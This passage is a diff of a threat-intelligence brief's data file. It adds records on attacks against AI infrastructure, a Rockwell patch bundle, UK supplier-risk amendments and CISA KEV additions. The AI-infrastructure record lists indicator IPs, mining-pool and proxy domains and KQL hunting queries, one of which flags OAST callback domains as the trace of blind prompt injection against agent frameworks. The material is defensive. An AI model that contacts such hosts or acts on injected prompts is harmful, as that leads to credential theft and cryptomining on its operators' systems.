+   "SENTINEL KQL — the published network indicators plus mining-pool egress, unioned so the query survives missing connectors.\n\n// AI infrastructure — Wiz-published infrastructure and mining egress\nlet lookback = 30d;\nlet badIPs = dynamic([\"185.62.1.8\",\"185.84.98.85\",\"94.26.106.29\"]);\nlet badDomains = dynamic([\"pool.hashvault.pro\",\"crazyeltonproxy.top\",\"1710.rwlp.be\"]);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where DestinationIP in (badIPs) or RequestURL has_any (badDomains) or DestinationHostName has_any (badDomains)\n   | project TimeGenerated, Source = \"CommonSecurityLog\", Host = DeviceName, Evidence = coalesce(RequestURL, DestinationHostName, DestinationIP)),\n  (DnsEvents\n   | where TimeGenerated > ago(lookback)\n   | where Name has_any (badDomains) or Name has \"oast.\" or Name has \"hashvault\"\n   | project TimeGenerated, Source = \"DnsEvents\", Host = Computer, Evidence = Name),\n  (DeviceNetworkEvents\n   | where Timestamp > ago(lookback)\n   | where RemoteIP in (badIPs) or RemoteUrl has_any (badDomains)\n   | project TimeGenerated = Timestamp, Source = \"DeviceNetworkEvents\", Host = DeviceName, Evidence = coalesce(RemoteUrl, RemoteIP))\n| sort by TimeGenerated desc",
+   "SENTINEL KQL — blind prompt injection leaves its only reliable trace in DNS: an OAST callback from a host running an agent framework.\n\n// AI infrastructure — OAST callback consistent with blind prompt injection\nDnsEvents\n| where TimeGenerated > ago(30d)\n| where Name has_any (\"oast.fun\",\"oast.pro\",\"oast.site\",\"oast.live\",\"interact.sh\",\"burpcollaborator.net\",\"requestbin\")\n| extend label = tostring(split(Name, \".\")[0])\n| summarize callbacks = count(), names = make_set(Name, 20), first = min(TimeGenerated), last = max(TimeGenerated) by Computer, ClientIP\n| sort by last desc",
+   "Where an AI host shows any of these signals, rotate provider keys before rebuilding. The credentials are the objective; the miner is the visible part."
+  ],
+  "source": "Wiz Threat Research — Yaara Shriki, \"Inside 90 days of attacks on AI infrastructure\", Aug 27, 2026; Microsoft Security Blog, \"When AI infrastructure becomes a target\", Aug 26, 2026; The Hacker News",
+  "sourceNote": "Aug 26 – Sep 3, 2026"
+ },
+ "rockwellsep": {
+  "eyebrow": "Rockwell Automation · Patch bundle · Sep 2–3, 2026",
+  "title": "More than a dozen fixes across RSLinx Classic, ControlLogix, FactoryTalk and ArmorStart",
+  "tags": [
+   [
+    "med",
+    "Critical Manufacturing"
+   ],
+   [
+    "med",
+    "No known exploitation"
+   ]
+  ],
+  "overview": "A scheduled remediation item rather than an incident. It is carried here because the affected list spans controllers and the engineering workstation software that talks to them, which is the pairing that matters for OT change windows.",
+  "technical": [
+   "Products with patches or workarounds: RSLinx Classic, ControlLogix and CompactLogix controllers, FactoryTalk Historian Machine Edition, FactoryTalk Activation Manager, ArmorStart Distributed Motor Controllers, ControlFLASH, and the Redundancy Module Configuration Tool.",
+   "Reported weakness classes: denial of service, remote code execution, privilege escalation and cross-site scripting.",
+   "CISA states it is not aware of exploitation of CVE-2026-9637."
+  ],
+  "iocs": [],
+  "iocNote": "No indicators published — no exploitation is known and this is a vendor patch release.",
+  "mitigation": [
+   "Fold the controller and workstation fixes into the same change window; patching RSLinx Classic without the controllers, or the reverse, leaves the communication path half-remediated.",
+   "Where a controller cannot be taken down inside the window, apply the vendor workaround and record the exception with a review date rather than deferring silently."
+  ],
+  "response": [
+   "No hunting queries: there is no reported exploitation and no indicators to hunt for. This record exists so the patch state is tracked alongside the rest of the brief."
+  ],
+  "source": "Rockwell Automation security advisories, CISA ICS advisories, Security Boulevard Daily OT Security News",
+  "sourceNote": "Sep 2–3, 2026"
+ },
+ "ukcsrb": {
+  "eyebrow": "UK Cyber Security and Resilience Bill · Amendments tabled Aug 24, 2026",
+  "title": "Ministers would gain powers to bar high-risk technology suppliers from critical sectors",
+  "tags": [
+   [
+    "med",
+    "All Sectors"
+   ],
+   [
+    "med",
+    "Policy · Supply chain"
+   ]
+  ],
+  "overview": "A policy development with direct bearing on the Iran-linked OT disruption already carried in this brief: the amendments followed reporting that a small UK energy facility was forced offline for four days, and they move supplier risk from guidance into ministerial power.",
+  "technical": [
+   "SecurityWeek reported on Sep 2, 2026 that late amendments to the UK Cyber Security and Resilience Bill, tabled Aug 24, would give ministers powers to prevent critical-sector organisations from using technology suppliers deemed high risk.",
+   "The bill has passed the House of Commons and is currently in the House of Lords.",
+   "The amendments followed reporting that Iran-linked adversaries forced a small UK energy facility offline for four days.",
+   "Separately, a Foundation for Defense of Democracies analysis dated Sep 2 describes Project Watershed 250, launched Aug 31 as a six-month Texas pilot pairing local water utilities with free federal, state and private-sector cybersecurity services, alongside proposed dedicated water-sector cybersecurity funding and Water Watch Center threat-intelligence and vulnerability-management support."
+  ],
+  "iocs": [],
+  "iocNote": "Policy item — no technical indicators.",
+  "mitigation": [
+   "UK critical-sector operators should be able to produce a current technology supplier inventory with country-of-origin and support-chain detail. That is the artefact a designation regime asks for first.",
+   "Where a supplier is plausibly in scope, identify the replacement path and its lead time now rather than after a designation."
+  ],
+  "response": [
+   "No hunting queries: this is a legislative and funding item with no adversary activity of its own. The related operational record is the Iran-linked OT disruption story in this brief."
+  ],
+  "source": "SecurityWeek, Foundation for Defense of Democracies, Security Boulevard Daily OT Security News",
+  "sourceNote": "Sep 2–3, 2026"
  }
 },
   META: {
@@ -3136,8 +3664,8 @@ window.CTI = {
   "cvss": 9.4,
   "admiralty": "A1",
   "conf": "Confirmed exploitation — vendor-confirmed customer incidents plus independent IR observation",
-  "confNote": "PaperCut confirms customer incidents but has published no detail on the activity or the actor. Huntress observed exploitation in two customer environments; watchTowr reports the chaining and the patch bypasses. The bypass claims are watchTowr's own and have not been independently confirmed. · KEV listing Aug 31, 2026 (BOD 26-04, forensic triage required); SecurityWeek reports escalation to active intrusions Sep 1, 2026",
-  "iocDate": "Aug 28, 2026",
+  "confNote": "PaperCut confirms customer incidents but has published no detail on the activity or the actor. Huntress observed exploitation in two customer environments; watchTowr reports the chaining and the patch bypasses. The bypass claims are watchTowr's own and have not been independently confirmed. · KEV listing Aug 31, 2026 (BOD 26-04, forensic triage required); SecurityWeek reports escalation to active intrusions Sep 1, 2026 · Sep 2: vendor-extended IOC list and reported installation of SimpleHelp and AnyDesk remote access tooling; federal deadline Sep 14, 2026",
+  "iocDate": "Aug 30, 2026 — extended vendor indicator list",
   "sectors": [
    "All Sectors",
    "Information Technology",
@@ -3561,13 +4089,13 @@ window.CTI = {
   ]
  },
  "jfrog82329": {
-  "status": "new",
+  "status": "updated",
   "conf": "Reported exploitation — watchTowr honeypot observation of admin-token minting; JFrog has not confirmed exploitation and no other reports exist",
-  "confNote": "Single-source exploitation evidence (watchTowr Attacker Eye). Vendor confirms the flaw and has patched it; CTO characterises it as improper authentication, not RCE, and self-hosted only. No KEV listing as of Sep 2, 2026; no published CVSS in the sources reviewed",
+  "confNote": "Single-source exploitation evidence (watchTowr Attacker Eye). Vendor confirms the flaw and has patched it; CTO characterises it as improper authentication, not RCE, and self-hosted only. No KEV listing as of Sep 2, 2026; no published CVSS in the sources reviewed · Added to CISA KEV Sep 2, 2026 with CVSS 9.8 and a federal deadline of Sep 5",
   "iocDate": "Aug 28, 2026 — patch released; Sep 1, 2026 — exploitation reported",
   "admiralty": "B2",
   "severity": 5,
-  "cvss": null,
+  "cvss": 9.8,
   "sectors": [
    "Information Technology"
   ],
@@ -3598,9 +4126,9 @@ window.CTI = {
   ]
  },
  "sonicwallsma": {
-  "status": "new",
+  "status": "updated",
   "conf": "Confirmed exploitation — vendor states it observed exploitation of both vulnerabilities, which it discovered internally while investigating attacks",
-  "confNote": "Single-source for the attack detail (SonicWall PSIRT, reported by SecurityWeek). No victim count, actor attribution, IOCs or KEV listing as of Sep 2, 2026",
+  "confNote": "Single-source for the attack detail (SonicWall PSIRT, reported by SecurityWeek). No victim count, actor attribution, IOCs or KEV listing as of Sep 2, 2026 · Both CVEs added to CISA KEV Sep 2, 2026 (BOD 26-04, federal deadline Sep 5)",
   "iocDate": "Sep 1, 2026 — advisory published; exploitation timeline not disclosed",
   "admiralty": "A2",
   "severity": 5,
@@ -3615,6 +4143,105 @@ window.CTI = {
    "T1059 — Command and Scripting Interpreter",
    "T1556 — Modify Authentication Process"
   ]
+ },
+ "kevsep02": {
+  "status": "new",
+  "conf": "Authoritative — CISA KEV catalog addition; each entry requires evidence of active exploitation",
+  "confNote": "Seven additions dated Sep 2, 2026 under BOD 26-04. Deadlines Sep 5 for five entries, Sep 16 for CVE-2026-48710 and CVE-2026-59822. The Kestra listing rests on a Microsoft report of likely exploitation in late June 2026",
+  "iocDate": "Sep 2, 2026 — KEV catalog addition",
+  "admiralty": "A1",
+  "severity": 5,
+  "cvss": 10,
+  "sectors": [
+   "All Sectors",
+   "Information Technology",
+   "Government Facilities",
+   "Communications"
+  ],
+  "attack": [
+   "T1190 Exploit Public-Facing Application",
+   "T1059 Command and Scripting Interpreter",
+   "T1078 Valid Accounts",
+   "T1496 Resource Hijacking"
+  ]
+ },
+ "switchvox": {
+  "status": "new",
+  "conf": "Confirmed exploitation — Horizon3.ai and Defused Cyber honeypot capture of valid exploitation attempts, with published indicators",
+  "confNote": "Exploitation first observed Aug 30, 2026 from a single source IP; patched Jul 14, 2026 in 8.4.0.2. Second-stage malware deployment reported by Help Net Security as possibly a cryptominer and not confirmed. Added to CISA KEV Sep 2 with a Sep 5 federal deadline",
+  "iocDate": "Aug 30, 2026 — first observed exploitation; indicators published Sep 1, 2026",
+  "admiralty": "A1",
+  "severity": 5,
+  "cvss": 9.3,
+  "sectors": [
+   "Communications",
+   "Information Technology",
+   "Commercial Facilities"
+  ],
+  "attack": [
+   "T1190 Exploit Public-Facing Application",
+   "T1505 Server Software Component",
+   "T1059 Command and Scripting Interpreter",
+   "T1057 Process Discovery",
+   "T1552 Unsecured Credentials"
+  ]
+ },
+ "aiinfra": {
+  "status": "new",
+  "conf": "Confirmed exploitation — two independent vendor telemetry sets (Wiz honeypots, Microsoft incident analysis) with published indicators",
+  "confNote": "Wiz covers 90 days to Aug 27, 2026. The blind prompt-injection payload is a reconstruction consistent with the observed process tree, stated as such by Wiz, not a captured prompt. The Qilin attribution for the LiteLLM chain is Wiz relaying external researchers, not first-hand attribution",
+  "iocDate": "Aug 26–27, 2026 — Wiz and Microsoft publications",
+  "admiralty": "A2",
+  "severity": 5,
+  "cvss": 10,
+  "sectors": [
+   "Information Technology",
+   "All Sectors"
+  ],
+  "attack": [
+   "T1190 Exploit Public-Facing Application",
+   "T1059.006 Command and Scripting Interpreter: Python",
+   "T1552.001 Unsecured Credentials: Credentials In Files",
+   "T1555 Credentials from Password Stores",
+   "T1496 Resource Hijacking",
+   "T1098.004 Account Manipulation: SSH Authorized Keys",
+   "T1027 Obfuscated Files or Information",
+   "T1070.004 Indicator Removal: File Deletion"
+  ]
+ },
+ "rockwellsep": {
+  "status": "new",
+  "conf": "Vendor advisory — patches and workarounds published; CISA states it is not aware of exploitation of CVE-2026-9637",
+  "confNote": "Scheduled remediation item. No exploitation reported, no indicators published",
+  "iocDate": "n/a — no exploitation reported",
+  "admiralty": "A2",
+  "severity": 3,
+  "cvss": null,
+  "sectors": [
+   "Critical Manufacturing",
+   "Energy",
+   "Water and Wastewater Systems"
+  ],
+  "attack": [
+   "T0812 Default Credentials",
+   "T1190 Exploit Public-Facing Application",
+   "T1499 Endpoint Denial of Service"
+  ]
+ },
+ "ukcsrb": {
+  "status": "new",
+  "conf": "Reported — SecurityWeek reporting on tabled amendments; the bill is in the House of Lords and the amendments are not law",
+  "confNote": "Amendments tabled Aug 24, 2026 and reported Sep 2. Legislative outcome undetermined",
+  "iocDate": "n/a — policy item",
+  "admiralty": "B2",
+  "severity": 2,
+  "cvss": null,
+  "sectors": [
+   "All Sectors",
+   "Energy",
+   "Water and Wastewater Systems"
+  ],
+  "attack": []
  }
 }
 };
